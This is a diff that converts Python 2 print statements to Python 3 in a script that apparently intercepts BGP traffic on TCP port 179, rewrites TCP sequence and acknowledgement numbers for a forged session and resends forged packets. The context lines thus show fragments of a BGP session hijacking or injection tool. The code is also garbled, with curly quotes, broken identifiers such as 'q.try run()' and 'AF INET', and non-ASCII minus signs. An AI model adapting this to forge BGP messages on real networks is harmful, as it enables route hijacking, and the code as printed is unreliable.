@@ -13,7 +13,7 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
             elif prev_type == 'send': #if previous message was again from sender
                 message[TCP].seq = newseq #set as new sequence number the next seq number to be acked stored in newseq variable
                 seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next sequence number to be acked is the seqnum of the message plus message length
-            print ”SEQ ADJUSTED ”
+            print(”SEQ ADJUSTED ”)
             if seq > 4294967295: #if sequence number has maxed out wrap around
                 seq = seq−4294967295
             prev_type = 'send' #set previous type to send
@@ -21,7 +21,7 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
             ack = message[TCP].ack #store in ack the next number to be used as a sequence number
             message[TCP].ack = seq #set ack as the previous sequence number +previous message length
             prev_type = 'ack' #set previous type ack
-            print ”ACK ADJUSTED”
+            print(”ACK ADJUSTED”)
 #delete checksums so they can be recalculated when the packet is send
         del message[IP].chksum
         del message[TCP].chksum
@@ -119,7 +119,7 @@ def process(i, payload):
     if proto is 0x06: #if protocol is TCP
         destination = str(pkt[IP].dst) #put packets destination to var destination
         if pkt[TCP].dport == 179 or pkt[TCP].sport == 179:
-            print ”BGP message Detected”
+            print(”BGP message Detected”)
             #If the session is reseted stop adjusting seq numbers and start rom scatch
             #if pkt[TCP].flags == 2:
             # firstfound = False
@@ -143,7 +143,7 @@ def process(i, payload):
                 if message[TCP].dport == port or message[TCP].sport == port:
                     send(message, verbose=0)
                 else: #If the message is not using the accepted port don't send anything
-                    print ”\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n”
+                    print(”\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n”)
             else: #if session was not forged yet do nothing (the message will be forwarded automatically)
                 pass
         else: #If the message is not bgp do nothing (the message will be forwarded automatically)
@@ -178,7 +178,7 @@ def main():
     try:
         q.try run() #try running the queue object
     except KeyboardInterrupt: #if ctrl ˆc interruption is used
-        print ”Exiting...” #print message
+        print(”Exiting...”) #print message
         q.unbind(socket.AF INET) #unbind socket
         q.close() #close object
         sys.exit(1) #close program
